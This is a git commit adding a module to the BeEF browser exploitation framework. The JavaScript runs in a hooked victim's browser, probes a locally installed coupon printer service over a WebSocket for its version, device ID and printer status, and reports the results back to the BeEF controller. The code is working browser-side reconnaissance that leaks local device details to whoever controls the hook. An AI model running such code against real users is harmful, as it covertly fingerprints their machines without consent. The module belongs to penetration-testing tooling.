dd47856c9110ad9ca3ccc64fa48f460dcf872a68
Brendan Coles <bcoles@gmail.com>
2017-05-20 17:37:44 +0000

    Add Detect Coupon Printer module

---
+++ modules/host/detect_coupon_printer/command.js
@@ -0,0 +1,63 @@
+//
+// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+
+  if (!beef.browser.hasWebSocket()) {
+    beef.debug('[Detect Coupon Printer] Error: browser does not support WebSockets');
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
+  }
+
+  //var url = 'ws://127.0.0.1:2687';
+  //var url = 'ws://127.0.0.1:26876';
+  var url = 'wss://printer.cpnprt.com:4004'; // resolves to 127.0.0.1
+
+  beef.debug('[Detect Coupon Printer] Opening WebSocket connection: ' + url);
+  const socket = new WebSocket(url);
+
+  socket.addEventListener('open', function (event) {
+
+    // Get Coupon Printer Service version
+    socket.send('method=GetVersion;input=Y|;separator=|');
+
+    // Device ID
+    socket.send('method=GetDeviceID;input=Y|;separator=|');
+
+    // Check Printer
+    socket.send('method=CheckPrinter;input=Y|;separator=|');
+
+  });
+
+  socket.onerror = function(error) {
+    beef.debug('[Detect Coupon Printer] WebSocket Error: ' + JSON.stringify(error));
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not detect coupon printer", beef.are.status_error());
+  };
+
+  socket.onclose = function(event) {
+    beef.debug('[Detect Coupon Printer] Disconnected from WebSocket.');
+  };
+
+  socket.addEventListener('message', function (event) {
+    beef.debug('[Detect Coupon Printer] WebSocket Response:' + event.data);
+    try {
+      var result = JSON.parse(event.data);
+      if (result['GetVersion']) {
+        beef.debug('[Detect Coupon Printer] Version: ' + result['GetVersion']);
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetVersion=" + result['GetVersion'], beef.are.status_success());
+      } else if (result['GetDeviceID']) {
+        beef.debug('[Detect Coupon Printer] Device ID: ' + result['GetDeviceID']);
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetDeviceID=" + result['GetDeviceID'], beef.are.status_success());
+      } else if (result['CheckPrinter']) {
+        beef.debug('[Detect Coupon Printer] Printer: ' + result['CheckPrinter']);
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "CheckPrinter=" + result['CheckPrinter'], beef.are.status_success());
+      }
+    } catch(e) {
+      beef.debug('Could not parse WebSocket response JSON: ' + event.data);
+    }
+  });
+
+});
+
---
+++ modules/host/detect_coupon_printer/module.rb
@@ -0,0 +1,11 @@
+#
+# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+
+class Detect_coupon_printer < BeEF::Core::Command
+  def post_execute
+    save({'result' => @datastore['results']})
+  end
+end
